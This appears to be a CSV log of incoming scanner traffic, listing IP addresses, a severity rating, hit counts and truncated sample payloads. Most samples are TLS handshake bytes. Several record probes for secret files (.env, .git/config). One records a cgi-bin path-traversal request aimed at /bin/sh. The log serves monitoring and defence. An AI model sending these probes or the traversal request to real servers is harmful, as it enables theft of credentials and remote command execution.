IP,SEVERITY,COUNT,SAMPLE_PAYLOAD
167.94.138.36,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03k\xC0n\x92 \xF2\xD9\x00\x89\xC32\xB4\xEB-\xCE\xF6.\xEA\x"
167.94.138.51,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03r\xAAS\xB4\xE8\x9AqI6\xA8\xD9\x9D\xD9=F\xB2\xDD\xB8\x12\"
167.94.146.49,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03"
170.64.147.133,HIGH,2,"GET /.env HTTP/1.1"
172.104.11.34,HIGH,2,"\x16\x03\x01\x01"
172.104.11.51,HIGH,2,"\x16\x03\x01\x01"
172.236.228.193,HIGH,2,"\x16\x03\x01\x01"
172.236.228.220,HIGH,2,"\x16\x03\x01\x01"
172.236.228.222,HIGH,2,"\x16\x03\x01\x01"
172.236.228.39,HIGH,2,"\x16\x03\x01\x01"
176.32.195.85,HIGH,2,"\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\"
178.128.242.42,HIGH,2,"GET /.env HTTP/1.1"
180.93.228.84,HIGH,2,"GET /.env HTTP/1.1"
180.93.230.246,HIGH,2,"GET /.env HTTP/1.1"
18.219.216.206,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD9\x8B\xE1#\xC6\xD7\xDAo\x86\x7F\x1F\x1E\xCD\x1Ab\x95\xA7\xE"
184.105.247.196,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03.\xA2>\xC36\x05\x96^\xDA"
185.102.115.6,HIGH,2,"\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xB0\xBF\xA2}M\x83\xFDom\xA3\xFE\xA3\xF6<r\x8Ci\x06"
185.130.47.197,HIGH,2,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03\xD9Je\xA7*\xE33\xCD:\xEE\xE2\x94\xEF+\xA9g\x80\xF9F\xD2"
185.186.25.215,HIGH,2,"GET /.env HTTP/1.1"
185.213.174.141,HIGH,2,"\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\x16\x5C\x87\xD4<\xE8\xE0R\xA7\xD4\x98\xD1C\x93\xC7I\xB3"
188.166.167.61,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03w\xB8n\x96\xC6\x8A\xBB\xD0\xA5\xEE\xF6r\x8AS}\x14+m\xCB\"
198.235.24.105,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xFD(\x15C-\xD9\x8F\xE0\x01u\x90\x94\x97\xD1.\xB3\xC4[\x"
198.235.24.164,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x8D\x00\xAA3\xF2\xA6&I`\xDEf2\xD8D\x0B\x1ED\xA3\x0C\x89"
198.235.24.182,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03Q\xD2\xF5\xD2\xE4\x1F\x1C\x90T\xDF\x17.=\xD1\x05\xFEA\xD"
198.235.24.205,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x5C\x08\x0B\x0B\xD7\x04(\xAF\xCF\x95\xCEb\x9E"
198.235.24.225,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xE2\xE9\xAB\x1D\xEE|V\xE22Mo\xCE"
198.235.24.45,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x19\xEA\xDAA\x96:5iqR#{\xD6\x85\x84\x0Ch\xA4=j\x01\x03\"
198.235.24.46,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03[\x1Ab\xF5-\xDA*\xB6\xC8%f\x19\x8F\xB6\xCA\x87v\xC2"
198.235.24.70,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xF8\x0F\xEB\x07\xF6V\xFD\x0B2\x88(D@\xA2\xED\x8F\x0F`\x"
198.235.24.78,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xC4"
204.76.203.215,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\x0B+\xEA\xAC\x96&\xF3__\xAF\xAF{\x96w\xA5$=\x9C\xED\x22"
205.210.31.165,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03a\x22u\xDF\x96\xC7\xC5w\xF1\x87\xA66\xFE\xD5\xC3\xC8\xD7"
205.210.31.168,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03J\xE0\xDD\x9D\x86\xE8kR\xF9\xF4#\xFCBr\x11\xFE(\xFEi\x84"
205.210.31.197,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03Tuqx2T@\xE0B\xC2\xC2\xEF\xA3\x9D\xC8\x8C\xAF\xAC\x83N\x9"
205.210.31.211,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03P\xA8\x93\xDE\x08\xCBb\xA8c\xFFi\xB6Qy|\x7FN\x9B\xADW\x8"
205.210.31.46,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xD9EF\xFEhI\xE5J\xC1\xAC$CY\x18\xC2\x91\x86\xF9f\x87%\x"
205.210.31.70,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03iu\x87a\x9A\xDF\x01uj\xDE\x9E\xAA:\x07\xBF\xB8N\x8E\xA75"
205.210.31.73,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03J\xB3\x11\x83\xB7\x1C\xA6\x1EO\x9A};\x01\x04X\xD1\xBC\x0"
205.210.31.87,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03|\xC5\x1C\x8A\x07[\xA8\xAB\xCD\x06A\x10\xC5\x04\x1A\xEB\"
206.168.34.124,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03W\x01\x9Bn\xA0\xE0Q^<\xE5,\x8B\x03 \xF8\x7F\xDD\x02\x87\"
206.168.34.202,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF4|\xB0E\xAE|\xB28\xD8c\xC4tE2\x1A\xA2\x19)\xF9\x13\x8"
206.168.34.217,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB7\xC2 \xB52=\x9Ac^M'\x07\x9Db\x22\xC4\xAD\xC5\xC2\x90"
209.38.23.58,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03_+\xCB}-J\xD4\x5C913\xA1WQ8\xE4[x)\xEF^-\x8B\xC9\xE1t\x14\xC0h"
35.163.180.208,HIGH,2,"\x16\x03\x01\x00\xFE\x01\x00\x00\xFA\x03\x03\x80-\xE7\xD4V\x8AQ\x80r\xFC\xBE\x8C\x99'\x96"
43.138.5.244,HIGH,2,"GET /.env HTTP/1.1"
44.199.243.124,HIGH,2,"\x16\x03\x01\x00\xFE\x01\x00\x00\xFA\x03\x03$\x86\xB3&\x9A\xBF\x1AL\xFE/\xD9\x95f{\xF6\xD9\xFB\x5C\x"
44.200.116.188,HIGH,2,"\x16\x03\x01\x00\xFE\x01\x00\x00\xFA\x03\x03d\xEAqD\x86\xA0S\xC1\x95\xB3(\xEEL\xDE\x82~\xF7b\x02\x15"
45.79.172.21,HIGH,2,"\x16\x03\x01\x01"
45.79.181.223,HIGH,2,"\x16\x03\x01\x01"
45.88.186.70,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xF9\x8C-\xEC\xD0\x97R\x8D&m\x016\xA7#\xBA8\x11\x10\xE6\"
47.251.93.227,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03d\xFCO\xC6X\xED_@\xD5\x91\xCF\xD7p/\xEA\xC8\xF8\x15\xEF\xA9\xC"
64.225.100.236,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03d\x8F-\xE4s\x96\xC6\xDE\x05$5\x19\xBFiT\xCD\xAC\xCDl\x0B"
64.227.66.177,HIGH,2,"GET /.env HTTP/1.1"
64.23.228.52,HIGH,2,"GET /.env HTTP/1.1"
64.23.251.93,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8C\xF5\xBD\xBA\xC28\xAE"
65.49.1.108,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03C\x8CI>\xCBC\xE0\x05\xCC\xAC\x19\xDBY\xC4\x14\xC7\xC3%\x95\x92"
66.132.153.126,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xCC\xCF\xB3~\x0E\xA2\xFB\xC7\xB7\x93\x94%\x16\xFFopsXS\"
80.82.70.133,HIGH,2,"\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\"
81.29.142.100,HIGH,2,"\x16\x03\x01\x05\xFC\x01\x00\x05\xF8\x03\x03*\x19#\x98\x18T\x83\xF5VeW\xBD"
89.42.231.184,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03P\xBEC{0+R\x00\x16\xF0\xE7~T3Bq2\xA4\x1B\x04\xC4\xC9\xEA"
92.63.197.197,HIGH,2,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x0C"
104.234.32.31,HIGH,2,"GET /redmine/.env HTTP/1.1"
104.248.42.184,HIGH,2,"\x16\x03\x01\x01$\x01\x00\x01 \x03\x03\xFD\x08\x01g5\xC33H\xEB\xE0O9\xA7\xE7\xA1\xC3\xD5\x9D\xA0(\xD"
134.199.153.215,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC3g\xE7\x16_4R\xBE\x90Q\xD5\xEE\x19[\x8F\xD38\xA8\xDF\x9A\xD"
138.68.169.215,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC0t\x5C\x07"
147.185.132.144,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC0n\xBCi7H!\x89'\x81\x0F$\xF5j C\x11\xAF\xA2.tl\x9E\xB"
147.185.132.168,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x5C\xD7=c\xC7K\xF3\xC8\xC7\xF5N\xDCRi\xBEf\xF5Z\x87E\xC"
147.185.132.177,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03I\x90)YSC\x8F\xE7\xB8\xC8\xD5\xD2\xB4\x8E]d\xD9\x9C=b?\x"
147.185.132.21,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x11~\x12`d\x0B\x85\xA0"
147.185.132.42,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xED\xE0\xD0\x05\x95\xF8\xC2\xFD"
147.185.132.48,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03A\xE4\x94@VP\x99\xD6\xC5\xDC\xD4\xB8\x00\xBB\x82\xEB9\xD"
147.185.132.9,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03bTA\xFF\xD0M\xFE\x18&\x9B\x82\x96?h\xFCc\x10\xD6<\x96\xA"
157.230.247.11,HIGH,2,"GET /.env HTTP/1.1"
159.203.44.163,HIGH,2,"GET /.env HTTP/1.1"
159.65.220.226,HIGH,2,"GET /.env HTTP/1.1"
159.65.96.43,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFB\xB7\xF8MB\xCA\x9F\x85\x9D\xCA\xD1\xEF\xC8q'#h5}:H\xB813g\"
161.35.84.53,HIGH,2,"GET /.env HTTP/1.1"
162.142.125.223,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF0\xE8\xA5i\x9BP6Q\xEC\xD7R\xED\xCA\xEC\x0EM\xFBjG\xF2"
162.142.125.32,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03`\xF1r\x073P\xD9\x16}\xC7qs\xFBxx\xD9\xB1\xA0\xD1\xE1\xF"
162.243.42.29,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Q\xC1=:\xC7!\x5C-C^\x8CP\x10\xDDl\x8B\x22;x\xBC\x9C\xE1\x92\xE"
165.227.40.87,HIGH,2,"GET /.env HTTP/1.1"
167.94.138.186,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD9\xDE\xC8?\xDEJ,\x85T\xDF\x9E\x7F\xEA-\xFB\x12b\x88"
172.236.228.111,HIGH,2,"\x16\x03\x01\x01"
173.239.240.66,HIGH,2,"GET /docker/.env HTTP/1.1"
173.239.240.68,HIGH,2,"GET /script/.env HTTP/1.1"
173.239.240.72,HIGH,2,"GET /fedex/.env HTTP/1.1"
173.239.240.85,HIGH,2,"GET /.env.dist HTTP/1.1"
174.138.6.31,HIGH,2,"GET /.env HTTP/1.1"
178.128.220.111,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8E\xB2\xE0\xC6\x0C\x9E\xEB\x8Ct"
181.215.65.80,HIGH,2,"GET /local/.env HTTP/1.1"
181.215.65.81,HIGH,2,"GET /cp/.env HTTP/1.1"
188.166.59.42,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03F\xB2%l\xF6)\xAC\xC8\x89\x88\xFBM6\xB0s\x1E\xD5\xD4\xDC\x06\xC"
198.235.24.168,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x7F\x80\x9D\xDCU\x0B^X\x17I*j\xDENY\x9D#(\xDC\xA8 5p\xD"
198.235.24.211,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xCD\x9AJ1\xAE\xBE\x12\x1B\xF4\xE2\xBAm\xC8!r\x80xw~yw\x"
198.235.24.212,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03v\x88\xDBuG\x89>Y+I5\x06\x9D\xECI\xADX\xFC\xFE\xD2]G\xD3"
198.235.24.245,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x8307\xB9\x04\x1FA\xF5X\xB7[MRx\x91y\xE4@\x12l(\x13\xBC"
205.210.31.109,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x8F\xD5\xC4\x91\xA9\xCE\x16\x13O\x5C\xD1\xF4\x5CD\xCEF\"
205.210.31.222,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03 wT\x05\xF2f%q,/;\xFA\xC9j\xA22:Ql\x88\xEA\x83\x8E\xD3Nz"
205.210.31.245,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03z:\x88 \xA3J|\xB0\xA8\x07\x10e\x8E\xBB\x15\x87\xD3~\xAB\"
205.210.31.65,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x031\x05\x11\x10>r\x92\xAE\x88GQl\xC7\xA6\xEC_\xCE\xD0\xE9K"
206.168.34.45,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03(n R\xAB\xB1\xFCG\xEE\x1FJ\xFE\xA3\x8C%\xD0\xC3\x94\x02n"
209.97.187.57,HIGH,2,"GET /.env HTTP/1.1"
216.180.246.11,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x06\xBC\x8B\x04\x8C\x0Bd~\x82\x13\x8B\x1C\xB5\xBB\x85\x"
31.14.32.6,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xAD\xA7\x04\x02\xFC\xB5P4\x8F\xA7\xD6\x9C\x80\xEAkq\x1D"
35.216.195.77,HIGH,2,"GET /.env HTTP/1.1"
35.92.88.4,HIGH,2,"\x16\x03\x01\x00\xFE\x01\x00\x00\xFA\x03\x03^\xDBj\xDA\xC7\xF0\xE2\xB8\x99\x90P\xCD`\x1Fu\xDD\x0EuN|"
41.249.216.6,HIGH,2,"GET /.env HTTP/1.1"
42.113.60.198,HIGH,2,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.91.64.6,HIGH,2,"\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03VQ\xC8V07\xC0\xC3\x16\xE7\xBAK\x02\xAB\xF3\xEE\xCD\xDC\x"
51.38.248.14,HIGH,2,"GET /.env HTTP/1.1"
52.12.6.13,HIGH,2,"\x16\x03\x01\x00\xFE\x01\x00\x00\xFA\x03\x03\x02\x02U\x8A~\x1D\x81\x02\xD4'\xC3\xC4\x1B~\xFE:\xD3\xE"
64.23.190.42,HIGH,2,"GET /.env HTTP/1.1"
64.23.209.139,HIGH,2,"GET /.env HTTP/1.1"
65.49.1.122,HIGH,2,"GET /.git/config HTTP/1.1"
65.49.1.202,HIGH,2,"GET /.git/config HTTP/1.1"
66.132.153.133,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xFA\x22\xAB'R\x0Bkdh\x16\x9A\x1A\x05\x05\xE3L\xB4\xB2\x"
66.132.153.135,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x06\xDAgv\xDB1\xD0\x16*(\xAB\x7F\xD0C\x9D\x16b\xBB\x09\"
68.183.8.140,HIGH,2,"GET /.env HTTP/1.1"
85.237.194.175,HIGH,2,"GET /docker/.env HTTP/1.1"
88.199.21.18,HIGH,2,"\x16\x03\x03\x00\x92\x01\x00\x00\x8E\x03\x03i~\xB2\x02\xAEw`\xF7\xEF\xFAE\xD9\xFB\xC2=\x86Q\x9Cm\xD0"
118.26.36.18,HIGH,2,"\x16\x03\x01\x01\x03\x01\x00\x00\xFF\x03\x03d~\xB3\xE9\xC2g\x8D\xFBU#@X\x05\x08\xBB\x94\xDF]\x96\xA6"
137.184.202.40,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03&76r\xF9GIp\x80\xDA\xB1v\xBE\xDC\x93\x0E\x10\x89\xD8\xA6\x00p\"
138.197.156.223,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1B\xAB\xB8\x91\x8DZ\x8B\xA6]\xC3\xC3\xEF\xCF$\xD3\xB9\xC1\xE"
162.142.125.196,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03j\x9Bp*7\xB3Y\xE6\x1F\xB7\xC6\x15\x0E\x1B~\x5C\x0E\xCC\x"
162.243.99.107,HIGH,2,"GET /.env HTTP/1.1"
172.236.228.224,HIGH,2,"\x16\x03\x01\x01"
195.177.94.73,HIGH,2,"GET /.env HTTP/1.1"
198.235.24.139,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xA7\x01\xB8\x06\xBE\xBA\x84\xC5\xC3\xE6-&x\xB0\x19!p\xE"
216.180.246.61,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x06\xFC\xDC/`\xC8"
45.79.181.251,HIGH,2,"\x16\x03\x01\x01"
64.226.81.53,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xD7\xD9,\xCC\x1E\x94gQ6+\x12\xB0t\xB1\xD8\x0Fz\xDC\xE7\"
66.132.153.114,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x8A\xD4#\xB7HR\x9F\x16\xEB-\xC1\xDD#,\x17C\x92q\x8D\xC0"
93.174.93.12,HIGH,2,"\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\"
101.198.0.182,HIGH,1,"\x16\x03\x01\x015\x01\x00\x011\x03\x03\xA7\x88\x93\xE7u\xEFH9s\xBA;\x9F\x0Bw\x9D\xAB;\x9F\xB0\xFB\xF"
101.36.108.158,HIGH,1,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03Mb|\xE8\xB3\xB9\x14O\x0F;;C\xAA\xF2\x85\xCD#\xD5)\x9D{\x"
103.218.241.7,HIGH,1,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03\x0FP\xF9\xB7\xC4\xA1\x13\xD0\x85\xB2\x8C\x8E\x93\xCA\xA"
104.152.52.143,HIGH,1,"\x16\x03\x01\x05\xCA\x01\x00\x05\xC6\x03\x03S\xDB\xF8\x15\x11\xBE\xE7\xBB\x17K\xFA\xE3h\x89u\xD3\x1A"
107.150.117.121,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\xFE\xE5\xBF*\xCA&\xFC\x9551%\xE9\x03N\xC2qI\xEBb\x94\x1"
112.187.172.15,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\x013c6\x8E\xB2Y;\xE7\x9A\xDD\x18ut\xB5\xD43\xEA\xED#\x9"
117.14.152.17,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC3\x80\xC4\x9An\xEC\x94a"
1.192.195.5,HIGH,1,"\x16\x03\x01\x015\x01\x00\x011\x03\x03w\xD9\xD9\x8A\x15\xED]b\xDC\xD9Ce\xE9\x1E\xA4Iq\x09\x85\xED\x1"
128.14.226.191,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\xE3\x09VQ\x95t\xEA0\xD0HDg\x18i\xA4\xA6|\x92\xF04\x9BDd"
128.199.197.109,HIGH,1,"\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xF4g\x1E\xB5g[\xBDW\x94W>\x00N\xC3\x08I"
143.198.184.130,HIGH,1,"\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xA9D\x8A\x87S\xA3\xB6\xEA\xA0VCr1\xE8\xC4zs\x9E6\x98Gb\"
152.32.145.49,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03'\x0FB9\xA1\xC6\x1A"
161.35.155.32,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ks?\x9B\xFC\xF3\xCE\xCE\xB3\x0C,\xAEd\x02s\xD0+NHm\xEBn\x94"
162.142.125.117,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x13\x84\xB9\x9B\xA2\x043\xCC\xFF\xFF\x02\xE99\x81\x80\x"
162.142.125.123,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03w\x8C\x22 \x02"
162.142.125.198,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF0\x9C\xD5r\xE3+\xDE7j\x04\xE7N|\xD8\x03\x8D\xB7\x8C\x"
162.142.125.208,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03g\x00C'J\xC1\xC6s\xE3G\xA2\xF7\x88\xF9\x97\xDE\x85\xC3P\"
162.142.125.213,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x1D$\xA0\xEF/Z"
165.154.41.6,HIGH,1,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03p\x076(.(\xAE}1~\x01\xDC\xD4\xF5\xC4\x8A\x81\x16^C\x12\x"
165.227.162.253,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03<dZ\xB3m\xD3\xEF\x12c\xC3\xF6(m\xB8\xC3\xB5\x8Ao<\xEE\xF"
167.94.138.113,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF9f\x9E~\x1B\xD9|\x8A\xA2z\x9Dk\xCB|\xCD\x95\x05\xC9r\"
167.94.138.116,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB3?\xD8\x1C\xCA(\xCB@c<\x07c\x8F\x96\x17\x0CV+^+\x10\x"
167.94.138.166,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC6G\xD8\xA3\xF4a\x8C\xFC\xB7\xBE \xAF\xA95\x18\xF5\x82"
167.94.138.173,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03)\xE3\xA6!n\x05}\xDD_"
167.94.138.184,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD8\xF4jw\x98\xD0\xEC\x7Fh\x97\x8B\xAC:\xFFjE\xB4\xC4\x"
167.94.138.188,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x97\x9B\x04P\x8D67\x1F5\xE2\x18Ui\xB7U\xEA\x06O\xBE\xAD"
167.94.138.200,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC5\xB9\x11\x09h\x1B7\xBF\x09\xC08\xF6x\xE3r<\xFD\x0ChY"
167.94.138.50,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x5C\xF2o\xC8\x07\xD1Z\xD5\x01\x19\xE2\xEF\xD5yl\x96\xB5"
167.94.138.58,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03]\x15X~\xAD}a\x91\xE2b\x01\x90\xC8y\xAF\x14/\x91\xBE\xD5"
